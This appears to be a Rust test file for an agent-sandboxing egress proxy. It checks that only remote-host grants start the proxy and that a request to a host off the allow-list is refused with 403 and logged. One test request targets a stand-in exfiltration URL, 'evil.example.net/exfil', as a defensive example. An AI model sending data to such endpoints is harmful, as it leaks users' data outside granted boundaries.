//! #257 Part B, proven at the facade: a **no-subprocess** caller (a
//! `reqwest::Client`) routes itself through the public egress proxy and the
//! per-host allow-list holds — a non-granted host is refused and recorded.
//!
//! This is the exact consumption shape newt Leg 4's in-process HTTP callers
//! use: `start_egress_proxy(&caveats)` + `reqwest::Proxy::all(addr)`. No
//! kernel fence applies here (the caller points *itself* at the proxy — the
//! allow-list is as strong as the caller's routing, honestly advisory); the
//! spawned-child shape with the loopback fence is proven in core's spawn
//! tests. Cross-platform (no sandbox backend involved), loopback-only network
//! (the proxy refuses before dialing anywhere off-box).

use agent_bridle::{start_egress_proxy, Caveats, Scope};

#[test]
fn non_proxy_grants_start_nothing() {
    // net: All / deny-all / loopback-only keep their kernel owners (#257
    // criterion 3): no proxy starts.
    assert!(start_egress_proxy(&Caveats::top()).unwrap().is_none());
    let deny = Caveats {
        net: Scope::only([] as [String; 0]),
        ..Caveats::top()
    };
    assert!(start_egress_proxy(&deny).unwrap().is_none());
    let loopback = Caveats {
        net: Scope::only(["localhost".to_string()]),
        ..Caveats::top()
    };
    assert!(start_egress_proxy(&loopback).unwrap().is_none());
}

#[tokio::test(flavor = "multi_thread")]
async fn reqwest_through_the_proxy_refuses_a_non_granted_host() {
    // A general remote-host grant calls for the proxy.
    let granted = Caveats {
        net: Scope::only(["api.example.com".to_string()]),
        ..Caveats::top()
    };
    let handle = start_egress_proxy(&granted)
        .expect("bind loopback")
        .expect("remote-host grant starts the proxy");
    assert!(handle.addr().ip().is_loopback());

    // The no-subprocess consumer: an ordinary reqwest client pointed at the
    // proxy (`Proxy::all`), exactly as an embedder would wire it.
    let client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::all(format!("http://{}", handle.addr())).expect("proxy url"))
        .build()
        .expect("client");

    // An off-allow-list host: the proxy answers 403 without dialing anywhere.
    // (Plain http => absolute-form forward; nothing leaves the box.)
    let resp = client
        .get("http://evil.example.net/exfil")
        .send()
        .await
        .expect("the refusal is an HTTP response, not a transport error");
    assert_eq!(resp.status(), 403, "off-list host must be refused");
    assert!(
        handle
            .refused_hosts()
            .contains(&"evil.example.net".to_string()),
        "the refusal is recorded (the exfil-attempt signal): {:?}",
        handle.refused_hosts()
    );
}
